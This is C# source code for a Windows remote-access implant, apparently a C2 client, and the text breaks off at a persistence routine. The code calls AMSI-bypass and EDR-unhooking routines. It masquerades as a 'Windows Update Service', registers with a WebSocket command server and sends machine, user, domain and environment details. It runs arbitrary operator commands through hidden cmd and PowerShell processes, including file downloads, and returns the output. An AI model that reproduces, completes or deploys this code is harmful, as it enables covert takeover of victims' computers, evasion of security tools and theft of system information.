using Microsoft.Win32;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.WebSockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Threading;
using System.Threading.Tasks;

// Disable warnings for AOT compatibility
#pragma warning disable IL2026, IL3050, IL2091

namespace C2ClientWindows
{
    // Program Entry Point
    class Program
    {
        [STAThread]
        static async Task Main(string[] args)
        {
            Console.WriteLine("[DEBUG] Application starting...");
            Console.WriteLine($"[DEBUG] Process ID: {Process.GetCurrentProcess().Id}");
            Console.WriteLine($"[DEBUG] User Interactive: {Environment.UserInteractive}");

            try
            {
                Console.WriteLine("[DEBUG] Initializing configuration...");
                // Initialize configuration
                AppConfig.Initialize();
                Console.WriteLine($"[DEBUG] Config initialized - Endpoint: {AppConfig.C2Endpoint}, UseTls: {AppConfig.UseTls}");

                Console.WriteLine("[DEBUG] Applying anti-detection techniques...");
                // Apply anti-detection techniques early
                var amsiResult = AntiDetection.BypassAmsi();
                Console.WriteLine($"[DEBUG] AMSI Bypass result: {amsiResult}");

                var edrResult = AntiDetection.UnhookEdr();
                Console.WriteLine($"[DEBUG] EDR Unhooking result: {edrResult}");

                // Check if running as service or console
                if (!Environment.UserInteractive)
                {
                    Console.WriteLine("[DEBUG] Running as Windows Service");
                    // Running as service
                    ServiceBase.Run(new C2Service());
                }
                else
                {
                    // Running as console
                    Console.WriteLine("[DEBUG] Running in console mode");
                    Console.WriteLine("Starting C2 Client in console mode...");

                    Console.WriteLine("[DEBUG] Collecting system information...");
                    // Initialize system info collector
                    var systemInfo = SystemInfoCollector.CollectSystemInfo();
                    Console.WriteLine($"[DEBUG] System info collected: {systemInfo.Count} items");

                    Console.WriteLine("[DEBUG] Initializing WebSocket manager...");
                    // Initialize WebSocket manager
                    var wsManager = WebSocketManager.Instance;

                    Console.WriteLine("[DEBUG] Attempting WebSocket connection...");
                    await wsManager.ConnectAsync(
                        Environment.MachineName,
                        Environment.Is64BitOperatingSystem ? "x64" : "x86",
                        GetOSVersion(),
                        systemInfo
                    );

                    // Keep the application running
                    Console.WriteLine("C2 Client started. Press any key to exit...");
                    Console.ReadKey();

                    Console.WriteLine("[DEBUG] Initiating clean shutdown...");
                    // Clean shutdown
                    await wsManager.DisconnectAsync();
                    Console.WriteLine("[DEBUG] Shutdown complete");
                }
            }
            catch (Exception ex)
            {
                // In a real implementation, we would handle this more gracefully
                // without revealing detailed error information
                Console.WriteLine($"[DEBUG] FATAL ERROR: {ex.GetType().Name}");
                Console.WriteLine($"Application error: {ex.Message}");
                Console.WriteLine($"[DEBUG] Stack trace: {ex.StackTrace}");
            }
        }

        // AOT-compatible OS version detection
        private static string GetOSVersion()
        {
            try
            {
                var version = Environment.OSVersion;
                return $"{version.Platform} {version.Version} (Build {version.Version.Build})";
            }
            catch
            {
                return "Windows";
            }
        }
    }

    // Configuration Management
    public static class AppConfig
    {
        public static Uri C2Endpoint { get; private set; }
        public static string AuthSecret { get; private set; }
        public static bool UseTls { get; private set; }
        public static string ServiceName { get; } = "WindowsUpdateService";
        public static string ServiceDisplayName { get; } = "Windows Update Service";
        public static string ServiceDescription { get; } = "Ensures that Windows components are updated and properly configured.";

        public static void Initialize()
        {
            Console.WriteLine("[DEBUG] AppConfig.Initialize() starting...");

            // Load configuration from environment variables
            var serverUrl = Environment.GetEnvironmentVariable("C2_SERVER");
            Console.WriteLine($"[DEBUG] C2_SERVER env var: {serverUrl ?? "null"}");

            if (string.IsNullOrEmpty(serverUrl))
            {
                serverUrl = "ws://localhost:8080/ws";
                Console.WriteLine("[DEBUG] Using default server URL: ws://localhost:8080/ws");
            }

            C2Endpoint = new Uri(serverUrl);
            Console.WriteLine($"[DEBUG] C2 Endpoint URI created: {C2Endpoint}");

            AuthSecret = Environment.GetEnvironmentVariable("CLIENT_AUTH_SECRET") ?? "default-secret";
            Console.WriteLine($"[DEBUG] Auth secret configured: {(!string.IsNullOrEmpty(AuthSecret) ? "Set" : "Empty")}");

            UseTls = C2Endpoint.Scheme == "wss";
            Console.WriteLine($"[DEBUG] TLS enabled: {UseTls}");

            Console.WriteLine("[DEBUG] AppConfig.Initialize() complete");
        }
    }

    // Message Types for C2 Communication (AOT-compatible)
    [JsonSerializable(typeof(RegisterMessage))]
    [JsonSerializable(typeof(HeartbeatMessage))]
    [JsonSerializable(typeof(OutputMessage))]
    [JsonSerializable(typeof(Dictionary<string, object>))]
    [JsonSerializable(typeof(Dictionary<string, string>))]
    public partial class MessageContext : JsonSerializerContext { }

    public class RegisterMessage
    {
        [JsonPropertyName("type")]
        public string Type { get; set; } = "register";

        [JsonPropertyName("uuid")]
        public string Uuid { get; set; }

        [JsonPropertyName("machineFingerprint")]
        public string MachineFingerprint { get; set; }

        [JsonPropertyName("computerName")]
        public string ComputerName { get; set; }

        [JsonPropertyName("ipAddress")]
        public string IpAddress { get; set; }

        [JsonPropertyName("hostname")]
        public string Hostname { get; set; }

        [JsonPropertyName("platform")]
        public string Platform { get; set; }

        [JsonPropertyName("capabilities")]
        public string[] Capabilities { get; set; }

        [JsonPropertyName("systemInfo")]
        public Dictionary<string, object> SystemInfo { get; set; }
    }

    public class HeartbeatMessage
    {
        [JsonPropertyName("type")]
        public string Type { get; set; } = "heartbeat";

        [JsonPropertyName("uuid")]
        public string Uuid { get; set; }

        [JsonPropertyName("systemInfo")]
        public Dictionary<string, object> SystemInfo { get; set; }
    }

    public class OutputMessage
    {
        [JsonPropertyName("type")]
        public string Type { get; set; } = "output";

        [JsonPropertyName("taskId")]
        public string TaskId { get; set; }

        [JsonPropertyName("output")]
        public string Output { get; set; }

        [JsonPropertyName("status")]
        public string Status { get; set; }

        [JsonPropertyName("timestamp")]
        public string Timestamp { get; set; }
    }

    // WebSocket Communication Manager
    public class WebSocketManager
    {
        private static readonly Lazy<WebSocketManager> _instance = new Lazy<WebSocketManager>(() => new WebSocketManager());
        public static WebSocketManager Instance => _instance.Value;

        private ClientWebSocket _ws = new ClientWebSocket();
        private Timer _heartbeatTimer;
        private string _clientId;
        private bool _isConnected = false;

        private WebSocketManager() { }

        public async Task ConnectAsync(string name, string arch, string os, Dictionary<string, object> systemInfo)
        {
            Console.WriteLine($"[DEBUG] ConnectAsync called - Name: {name}, Arch: {arch}, OS: {os}");

            try
            {
                Console.WriteLine($"[DEBUG] Connecting to WebSocket endpoint: {AppConfig.C2Endpoint}");
                // Connect to C2 server
                await _ws.ConnectAsync(AppConfig.C2Endpoint, CancellationToken.None);
                Console.WriteLine($"[DEBUG] WebSocket connected successfully. State: {_ws.State}");

                // Generate UUID for this client
                _clientId = Guid.NewGuid().ToString();
                Console.WriteLine($"[DEBUG] Generated client UUID: {_clientId}");

                // Send registration message
                var registerMessage = new RegisterMessage
                {
                    Uuid = _clientId,
                    MachineFingerprint = HelperMethods.GenerateMachineFingerprint(),
                    ComputerName = name,
                    IpAddress = HelperMethods.GetLocalIPAddress(),
                    Hostname = name,
                    Platform = os,
                    Capabilities = new string[] { "execute_command", "system_info", "file_operations" },
                    SystemInfo = systemInfo
                };

                // Log registration payload
                try
                {
                    var regJson = JsonSerializer.Serialize(registerMessage, typeof(RegisterMessage), MessageContext.Default);
                    Console.WriteLine($"[DEBUG] Registration payload: {regJson}");
                }
                catch { }

                Console.WriteLine("[DEBUG] Sending registration message...");
                await SendAsync(registerMessage);
                Console.WriteLine("[DEBUG] Registration message sent successfully");

                // Start heartbeat timer (30 seconds)
                Console.WriteLine("[DEBUG] Starting heartbeat timer (30 second interval)...");
                _heartbeatTimer = new Timer(async _ => await SendHeartbeat(), null, TimeSpan.FromSeconds(30), TimeSpan.FromSeconds(30));

                // Start message receive loop
                Console.WriteLine("[DEBUG] Starting message receive loop...");
                _ = Task.Run(ReceiveLoop);

                _isConnected = true;
                Console.WriteLine("[DEBUG] Connection initialization complete. Connected = true");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[DEBUG] Connection failed: {ex.GetType().Name} - {ex.Message}");
                Console.WriteLine($"[DEBUG] Stack trace: {ex.StackTrace}");
                // Handle connection errors
                throw new Exception($"Failed to connect to C2 server: {ex.Message}");
            }
        }

        public async Task DisconnectAsync()
        {
            Console.WriteLine($"[DEBUG] DisconnectAsync called. IsConnected: {_isConnected}");
            if (_isConnected)
            {
                Console.WriteLine("[DEBUG] Disposing heartbeat timer...");
                _heartbeatTimer?.Dispose();

                Console.WriteLine("[DEBUG] Closing WebSocket connection...");
                await _ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "Client disconnecting", CancellationToken.None);

                _isConnected = false;
                Console.WriteLine("[DEBUG] Disconnection complete");
            }
        }

        private async Task SendHeartbeat()
        {
            Console.WriteLine($"[DEBUG] Heartbeat timer triggered. WS State: {_ws.State}, ClientId: {_clientId ?? "null"}");

            if (_ws.State == WebSocketState.Open && !string.IsNullOrEmpty(_clientId))
            {
                Console.WriteLine($"[DEBUG] Sending heartbeat at {DateTime.UtcNow:o}...");
                var heartbeatMessage = new HeartbeatMessage 
                { 
                    Uuid = _clientId,
                    SystemInfo = SystemInfoCollector.CollectSystemInfo()
                };
                await SendAsync(heartbeatMessage);
                Console.WriteLine("[DEBUG] Heartbeat sent");
            }
            else
            {
                Console.WriteLine($"[DEBUG] Heartbeat skipped - WS not open or no client ID");
            }
        }

        public async Task SendAsync<T>(T message)
        {
            Console.WriteLine($"[DEBUG] SendAsync called with message type: {typeof(T).Name}");

            try
            {
                // Serialize message to JSON using AOT-compatible serializer
                var json = JsonSerializer.Serialize(message, typeof(T), MessageContext.Default);
                Console.WriteLine($"[DEBUG] Message serialized to JSON ({json.Length} bytes)");
                var plaintext = Encoding.UTF8.GetBytes(json);

                // Send plain JSON message (no encryption)
                Console.WriteLine($"[DEBUG] Sending plain JSON message via WebSocket...");
                await _ws.SendAsync(new ArraySegment<byte>(plaintext), WebSocketMessageType.Text, true, CancellationToken.None);
                Console.WriteLine("[DEBUG] Message sent successfully");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[DEBUG] SendAsync failed: {ex.GetType().Name} - {ex.Message}");
                // Handle send errors
                throw new Exception($"Failed to send message: {ex.Message}");
            }
        }

        private async Task ReceiveLoop()
        {
            Console.WriteLine("[DEBUG] ReceiveLoop started");
            var buffer = new byte[8192];

            try
            {
                while (_ws.State == WebSocketState.Open)
                {
                    Console.WriteLine($"[DEBUG] Waiting for message... (WS State: {_ws.State})");
                    var result = await _ws.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);

                    Console.WriteLine($"[DEBUG] Message received - Type: {result.MessageType}, Size: {result.Count} bytes");

                    if (result.MessageType == WebSocketMessageType.Close)
                    {
                        Console.WriteLine("[DEBUG] Close message received, closing connection...");
                        await _ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "Closing", CancellationToken.None);
                        break;
                    }

                    try
                    {
                        // Parse the received message (plain JSON)
                        Console.WriteLine("[DEBUG] Parsing received message...");
                        var json = Encoding.UTF8.GetString(buffer, 0, result.Count);
                        Console.WriteLine($"[DEBUG] Message received successfully ({json.Length} chars)");

                        // Parse and handle the message
                        Console.WriteLine("[DEBUG] Parsing JSON message...");
                        HandleMessage(JsonDocument.Parse(json).RootElement);
                    }
                    catch (Exception innerEx)
                    {
                        Console.WriteLine($"[DEBUG] Error processing message: {innerEx.GetType().Name} - {innerEx.Message}");
                    }
                }

                Console.WriteLine($"[DEBUG] ReceiveLoop exiting. Final WS State: {_ws.State}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[DEBUG] ReceiveLoop error: {ex.GetType().Name} - {ex.Message}");
                Console.WriteLine($"[DEBUG] Stack trace: {ex.StackTrace}");
                // Handle receive errors
                // In a real implementation, we might try to reconnect
            }
        }

        private void HandleMessage(JsonElement message)
        {
            Console.WriteLine("[DEBUG] HandleMessage called");

            try
            {
                var type = message.GetProperty("type").GetString();
                Console.WriteLine($"[DEBUG] Message type: {type}");

                switch (type)
                {
                    case "register_success":
                        Console.WriteLine("[DEBUG] Registration successful message received");
                        break;

                    case "command":
                        Console.WriteLine("[DEBUG] Command message received");
                        // Check cmd field to determine command type
                        if (message.TryGetProperty("cmd", out var cmdProp) && cmdProp.GetString() == "execute") {
                        var taskId = message.GetProperty("taskId").GetString();
                        var command = message.GetProperty("command").GetString();
                        Console.WriteLine($"[DEBUG] Executing command: {command} with taskId: {taskId}");
                        _ = Task.Run(() => CommandExecutor.ExecuteCommand(taskId, command));
                        }
                        break;

                    case "uninstall":
                        Console.WriteLine("[DEBUG] Uninstall command received");
                        // Handle uninstall command
                        PersistenceManager.Uninstall();
                        break;

                    default:
                        Console.WriteLine($"[DEBUG] Unknown message type: {type}");
                        // Unknown message type
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[DEBUG] HandleMessage error: {ex.GetType().Name} - {ex.Message}");
                // Handle message parsing errors
            }
        }
    }

    // Encryption Service
    public static class CryptoService
    {
        private static readonly byte[] Key = Convert.FromBase64String(
            Environment.GetEnvironmentVariable("ENCRYPTION_KEY") ??
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=" // Default key (should be replaced)
        );

        public static byte[] Encrypt(byte[] plaintext)
        {
            using var aes = new AesGcm(Key);
            var nonce = new byte[AesGcm.NonceByteSizes.MaxSize];
            var ciphertext = new byte[plaintext.Length];
            var tag = new byte[AesGcm.TagByteSizes.MaxSize];

            // Generate random nonce
            RandomNumberGenerator.Fill(nonce);

            // Encrypt
            aes.Encrypt(nonce, plaintext, ciphertext, tag);

            // Return nonce + tag + ciphertext
            return nonce.Concat(tag).Concat(ciphertext).ToArray();
        }

        public static byte[] Decrypt(byte[] encryptedData)
        {
            using var aes = new AesGcm(Key);

            // Extract nonce, tag, and ciphertext
            var nonce = encryptedData.Take(AesGcm.NonceByteSizes.MaxSize).ToArray();
            var tag = encryptedData.Skip(AesGcm.NonceByteSizes.MaxSize).Take(AesGcm.TagByteSizes.MaxSize).ToArray();
            var ciphertext = encryptedData.Skip(AesGcm.NonceByteSizes.MaxSize + AesGcm.TagByteSizes.MaxSize).ToArray();

            var plaintext = new byte[ciphertext.Length];

            // Decrypt
            aes.Decrypt(nonce, ciphertext, tag, plaintext);

            return plaintext;
        }
    }

    // Command Executor
    public static class CommandExecutor
    {
        public static async void ExecuteCommand(string taskId, string command)
        {
            Console.WriteLine("[DEBUG] CommandExecutor.ExecuteCommand called");

            try
            {
                Console.WriteLine($"[DEBUG] Task ID: {taskId}");
                Console.WriteLine($"[DEBUG] Command to execute: {command}");

                // Execute command using LoLBins for stealth
                Console.WriteLine("[DEBUG] Executing command via LoLBins...");
                var result = await LoLBinsInvoker.ExecuteCommandAsync(command);
                Console.WriteLine($"[DEBUG] Command execution complete. Result length: {result?.Length ?? 0}");

                // Send result back to C2
                var outputMessage = new OutputMessage
                {
                    TaskId = taskId,
                    Output = result ?? "",
                    Status = "success",
                    Timestamp = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
                };

                Console.WriteLine("[DEBUG] Sending command output back to C2...");
                await WebSocketManager.Instance.SendAsync(outputMessage);
                Console.WriteLine("[DEBUG] Command output sent successfully");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[DEBUG] CommandExecutor error: {ex.GetType().Name} - {ex.Message}");
                Console.WriteLine($"[DEBUG] Stack trace: {ex.StackTrace}");
                
                // Send error response
                try
                {
                    var errorMessage = new OutputMessage
                    {
                        TaskId = taskId,
                        Output = $"Command execution failed: {ex.Message}",
                        Status = "error",
                        Timestamp = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
                    };
                    await WebSocketManager.Instance.SendAsync(errorMessage);
                }
                catch (Exception sendEx)
                {
                    Console.WriteLine($"[DEBUG] Failed to send error response: {sendEx.Message}");
                }
            }
        }
    }

    // LoLBins (Living off the Land) Invoker
    public static class LoLBinsInvoker
    {
        // List of trusted Windows binaries to use for command execution
        private static readonly Dictionary<string, string> LoLBins = new Dictionary<string, string>
        {
            { "cmd", "cmd.exe" },
            { "powershell", "powershell.exe" },
            { "mshta", "mshta.exe" },
            { "regsvr32", "regsvr32.exe" },
            { "rundll32", "rundll32.exe" },
            { "wmic", "wmic.exe" }
        };

        public static async Task<string> ExecuteCommandAsync(string command)
        {
            try
            {
                Console.WriteLine($"[DEBUG] LoLBinsInvoker.ExecuteCommandAsync called with: {command}");
                
                // Determine the best execution method based on command type
                if (command.StartsWith("wmic", StringComparison.OrdinalIgnoreCase))
                {
                    Console.WriteLine("[DEBUG] Detected WMIC command, executing directly");
                    return await ExecuteWmicCommand(command);
                }
                else if (command.StartsWith("powershell", StringComparison.OrdinalIgnoreCase) || 
                         command.Contains("Invoke-WebRequest") || 
                         command.Contains("Invoke-Expression") ||
                         command.Contains("Get-WmiObject") ||
                         command.Contains("Get-Process") ||
                         command.Contains("Get-Service"))
                {
                    Console.WriteLine("[DEBUG] Detected PowerShell command, executing via PowerShell");
                    return await ExecutePowerShellCommand(command);
                }
                else if (command.Contains("Invoke-WebRequest") || command.Contains("Download"))
                {
                    Console.WriteLine("[DEBUG] Detected download command, executing via PowerShell with extended timeout");
                    // Modify the command to provide immediate feedback
                    var modifiedCommand = command;
                    if (command.Contains("Invoke-WebRequest") && !command.Contains("Write-Host"))
                    {
                        // Add immediate feedback and progress with verbose output
                        modifiedCommand = "Write-Host '=== DOWNLOAD STARTING ==='; " + command.Replace("Invoke-WebRequest", "Write-Host 'Downloading file...'; Invoke-WebRequest -Verbose");
                        // Extract the output file path and add verification
                        var outFileMatch = System.Text.RegularExpressions.Regex.Match(command, @"-OutFile\s+'([^']+)'");
                        if (outFileMatch.Success)
                        {
                            var outFile = outFileMatch.Groups[1].Value;
                            var outDir = System.IO.Path.GetDirectoryName(outFile);
                            modifiedCommand = $"Write-Host '=== DOWNLOAD STARTING ==='; Write-Host 'Target directory: {outDir}'; Write-Host 'Target file: {outFile}'; " + 
                                            $"if (!(Test-Path '{outDir}')) {{ Write-Host 'Creating directory: {outDir}'; New-Item -ItemType Directory -Path '{outDir}' -Force }}; " +
                                            command.Replace("Invoke-WebRequest", "Write-Host 'Downloading file...'; Invoke-WebRequest -Verbose") +
                                            $"; Write-Host '=== DOWNLOAD COMPLETE ==='; Write-Host 'Checking for file at: {outFile}'; " +
                                            $"if (Test-Path '{outFile}') {{ Write-Host 'SUCCESS: File downloaded successfully'; Get-Item '{outFile}' | Select-Object Name, Length, LastWriteTime, FullName | Format-List }} else {{ Write-Host 'ERROR: File not found after download'; Write-Host 'Current directory:'; Get-Location; Write-Host 'Files in target directory:'; Get-ChildItem '{outDir}' -ErrorAction SilentlyContinue }}";
                        }
                        else
                        {
                            modifiedCommand += "; Write-Host '=== DOWNLOAD COMPLETE ==='";
                        }
                    }
                    return await ExecutePowerShellCommand(modifiedCommand);
                }
                else if (command.StartsWith("systeminfo", StringComparison.OrdinalIgnoreCase))
                {
                    Console.WriteLine("[DEBUG] Detected systeminfo command, executing directly");
                    return await ExecuteSystemInfoCommand(command);
                }
                else
                {
                    Console.WriteLine("[DEBUG] Using cmd.exe for standard command");
                    return await ExecuteCmdCommand(command);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[DEBUG] LoLBinsInvoker error: {ex.GetType().Name} - {ex.Message}");
                return $"Command execution failed: {ex.Message}";
            }
        }

        private static async Task<string> ExecuteWmicCommand(string command)
        {
            try
            {
                // Try to execute WMIC directly first
                var startInfo = new ProcessStartInfo
                {
                    FileName = "wmic.exe",
                    Arguments = command.Substring(5), // Remove "wmic " prefix
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                using var process = Process.Start(startInfo);
                if (process == null)
                {
                    throw new Exception("Failed to start WMIC process");
                }

                var output = await process.StandardOutput.ReadToEndAsync();
                var error = await process.StandardError.ReadToEndAsync();

                await Task.Run(() => process.WaitForExit(30000));

                if (process.ExitCode != 0 && !string.IsNullOrEmpty(error))
                {
                    // If WMIC fails, try alternative methods
                    Console.WriteLine("[DEBUG] WMIC failed, trying alternative method");
                    return await ExecuteWmicAlternative(command);
                }

                return string.IsNullOrEmpty(error) ? output : $"{output}\nError: {error}";
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[DEBUG] WMIC execution failed: {ex.Message}, trying alternative");
                return await ExecuteWmicAlternative(command);
            }
        }

        private static async Task<string> ExecuteWmicAlternative(string command)
        {
            try
            {
                Console.WriteLine($"[DEBUG] ExecuteWmicAlternative called with: {command}");
                
                // Convert WMIC commands to PowerShell Get-WmiObject equivalents
                var wmicArgs = command.Substring(5).Trim(); // Remove "wmic " prefix
                string psCommand = "";
                
                if (wmicArgs.StartsWith("computersystem"))
                {
                    psCommand = "Get-WmiObject -Class Win32_ComputerSystem | Select-Object Model,Name,Manufacturer,SystemType | Format-Table -AutoSize";
                }
                else if (wmicArgs.StartsWith("cpu"))
                {
                    psCommand = "Get-WmiObject -Class Win32_Processor | Select-Object Name,NumberOfCores,NumberOfLogicalProcessors | Format-Table -AutoSize";
                }
                else if (wmicArgs.StartsWith("memorychip"))
                {
                    psCommand = "Get-WmiObject -Class Win32_PhysicalMemory | Select-Object Capacity,Speed,Manufacturer | Format-Table -AutoSize";
                }
                else if (wmicArgs.StartsWith("logicaldisk"))
                {
                    psCommand = "Get-WmiObject -Class Win32_LogicalDisk | Select-Object Size,FreeSpace,Caption | Format-Table -AutoSize";
                }
                else if (wmicArgs.StartsWith("product"))
                {
                    psCommand = "Get-WmiObject -Class Win32_Product | Select-Object Name,Version | Format-Table -AutoSize";
                }
                else if (wmicArgs.Contains("/node:") && wmicArgs.Contains("process call create"))
                {
                    // Handle remote process creation commands
                    psCommand = "Write-Host 'Remote process creation not supported via PowerShell WMI. Use Invoke-WmiMethod or Start-Process instead.'";
                }
                else if (wmicArgs.StartsWith("process"))
                {
                    psCommand = "Get-WmiObject -Class Win32_Process | Select-Object Name,ProcessId,CommandLine | Format-Table -AutoSize";
                }
                else if (wmicArgs.StartsWith("service"))
                {
                    psCommand = "Get-WmiObject -Class Win32_Service | Select-Object Name,State,StartMode | Format-Table -AutoSize";
                }
                else if (wmicArgs.StartsWith("useraccount"))
                {
                    psCommand = "Get-WmiObject -Class Win32_UserAccount | Select-Object Name,Domain,Disabled | Format-Table -AutoSize";
                }
                else if (wmicArgs.StartsWith("bios"))
                {
                    psCommand = "Get-WmiObject -Class Win32_BIOS | Select-Object Manufacturer,Version,SerialNumber | Format-Table -AutoSize";
                }
                else
                {
                    // Generic fallback - try to execute the original WMIC command
                    psCommand = $"wmic {wmicArgs}";
                }

                Console.WriteLine($"[DEBUG] PowerShell command: {psCommand}");

                var startInfo = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-Command \"{psCommand}\"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                using var process = Process.Start(startInfo);
                if (process == null)
                {
                    throw new Exception("Failed to start PowerShell process");
                }

                Console.WriteLine("[DEBUG] PowerShell process started, reading output...");
                var output = await process.StandardOutput.ReadToEndAsync();
                var error = await process.StandardError.ReadToEndAsync();

                Console.WriteLine($"[DEBUG] PowerShell output length: {output?.Length ?? 0}");
                Console.WriteLine($"[DEBUG] PowerShell error length: {error?.Length ?? 0}");

                await Task.Run(() => process.WaitForExit(30000));

                Console.WriteLine($"[DEBUG] PowerShell process exited with code: {process.ExitCode}");

                return string.IsNullOrEmpty(error) ? output : $"{output}\nError: {error}";
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[DEBUG] ExecuteWmicAlternative error: {ex.Message}");
                return $"WMIC command failed: {ex.Message}";
            }
        }

        private static async Task<string> ExecutePowerShellCommand(string command)
        {
            try
            {
                Console.WriteLine($"[DEBUG] ExecutePowerShellCommand called with: {command}");
                
                var startInfo = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-Command \"{command}\"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                using var process = Process.Start(startInfo);
                if (process == null)
                {
                    throw new Exception("Failed to start PowerShell process");
                }

                Console.WriteLine("[DEBUG] PowerShell process started, reading output...");
                var output = await process.StandardOutput.ReadToEndAsync();
                var error = await process.StandardError.ReadToEndAsync();

                // Longer timeout for PowerShell, especially for downloads
                var timeoutMs = command.Contains("Invoke-WebRequest") || command.Contains("Download") ? 300000 : 60000; // 5 minutes for downloads
                Console.WriteLine($"[DEBUG] Waiting for PowerShell process to exit (timeout: {timeoutMs}ms)...");
                
                var exited = await Task.Run(() => process.WaitForExit(timeoutMs));
                if (!exited)
                {
                    Console.WriteLine("[DEBUG] PowerShell process did not exit within timeout, killing process...");
                    try
                    {
                        process.Kill();
                        await Task.Run(() => process.WaitForExit(5000));
                    }
                    catch (Exception killEx)
                    {
                        Console.WriteLine($"[DEBUG] Error killing process: {killEx.Message}");
                    }
                    return "Command timed out - process was killed after 5 minutes";
                }

                Console.WriteLine($"[DEBUG] PowerShell process exited with code: {process.ExitCode}");
                Console.WriteLine($"[DEBUG] PowerShell output length: {output?.Length ?? 0}");
                Console.WriteLine($"[DEBUG] PowerShell error length: {error?.Length ?? 0}");

                return string.IsNullOrEmpty(error) ? output : $"{output}\nError: {error}";
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[DEBUG] ExecutePowerShellCommand error: {ex.Message}");
                return $"PowerShell command failed: {ex.Message}";
            }
        }

        private static async Task<string> ExecuteSystemInfoCommand(string command)
        {
            try
            {
                var startInfo = new ProcessStartInfo
                {
                    FileName = "systeminfo.exe",
                    Arguments = command.Contains("findstr") ? "" : "",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                using var process = Process.Start(startInfo);
                if (process == null)
                {
                    throw new Exception("Failed to start systeminfo process");
                }

                var output = await process.StandardOutput.ReadToEndAsync();
                var error = await process.StandardError.ReadToEndAsync();

                await Task.Run(() => process.WaitForExit(30000));

                // If command contains findstr, filter the output
                if (command.Contains("findstr"))
                {
                    var lines = output.Split('\n');
                    var filteredLines = lines.Where(line => 
                        line.Contains("OS Name", StringComparison.OrdinalIgnoreCase) ||
                        line.Contains("OS Version", StringComparison.OrdinalIgnoreCase) ||
                        line.Contains("System Type", StringComparison.OrdinalIgnoreCase)
                    );
                    output = string.Join("\n", filteredLines);
                }

                return string.IsNullOrEmpty(error) ? output : $"{output}\nError: {error}";
            }
            catch (Exception ex)
            {
                return $"SystemInfo command failed: {ex.Message}";
            }
        }

        private static async Task<string> ExecuteCmdCommand(string command)
        {
            try
            {
                var startInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/C {command}",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                using var process = Process.Start(startInfo);
                if (process == null)
                {
                    throw new Exception("Failed to start cmd process");
                }

                var output = await process.StandardOutput.ReadToEndAsync();
                var error = await process.StandardError.ReadToEndAsync();

                await Task.Run(() => process.WaitForExit(30000));

                return string.IsNullOrEmpty(error) ? output : $"{output}\nError: {error}";
            }
            catch (Exception ex)
            {
                return $"CMD command failed: {ex.Message}";
            }
        }
    }

    // System Information Collector (AOT-compatible without WMI)
    public static class SystemInfoCollector
    {
        public static Dictionary<string, object> CollectSystemInfo()
        {
            try
            {
                var systemInfo = new Dictionary<string, object>
                {
                    ["ComputerName"] = Environment.MachineName,
                    ["UserName"] = Environment.UserName,
                    ["OSVersion"] = GetOSVersion(),
                    ["DomainName"] = Environment.UserDomainName,
                    ["ProcessorCount"] = Environment.ProcessorCount.ToString(),
                    ["SystemDirectory"] = Environment.SystemDirectory,
                    ["Is64BitOperatingSystem"] = Environment.Is64BitOperatingSystem.ToString(),
                    ["CLRVersion"] = Environment.Version.ToString(),
                    ["WorkingSet"] = Environment.WorkingSet.ToString(),
                    ["PageSize"] = Environment.SystemPageSize.ToString()
                };

                // Collect additional system information without WMI
                try
                {
                    systemInfo["LogicalDrives"] = string.Join(",", Environment.GetLogicalDrives());

                    // Get memory information
                    var gc = GC.GetTotalMemory(false);
                    systemInfo["ManagedMemory"] = gc.ToString();

                    // Get process information
                    var process = Process.GetCurrentProcess();
                    systemInfo["ProcessId"] = process.Id.ToString();
                    systemInfo["ProcessStartTime"] = process.StartTime.ToString();

                    // Get environment variables
                    var envVars = new Dictionary<string, string>();
                    foreach (DictionaryEntry env in Environment.GetEnvironmentVariables())
                    {
                        if (env.Key.ToString().StartsWith("COMPUTER") ||
                            env.Key.ToString().StartsWith("USER") ||
                            env.Key.ToString().StartsWith("PROCESSOR"))
                        {
                            envVars[env.Key.ToString()] = env.Value.ToString();
                        }
                    }
                    systemInfo["EnvironmentVariables"] = envVars;
                }
                catch
                {
                    // If additional collection fails, continue with basic info
                }

                return systemInfo;
            }
            catch
            {
                // Return minimal info if collection fails
                return new Dictionary<string, object>
                {
                    ["ComputerName"] = Environment.MachineName,
                    ["OSVersion"] = GetOSVersion()
                };
            }
        }

        private static string GetOSVersion()
        {
            try
            {
                var version = Environment.OSVersion;
                return $"{version.Platform} {version.Version} (Build {version.Version.Build})";
            }
            catch
            {
                return "Windows";
            }
        }
    }

    // Persistence Manager
    public static class PersistenceManager
    {
        public static void InstallPersistence()
        {
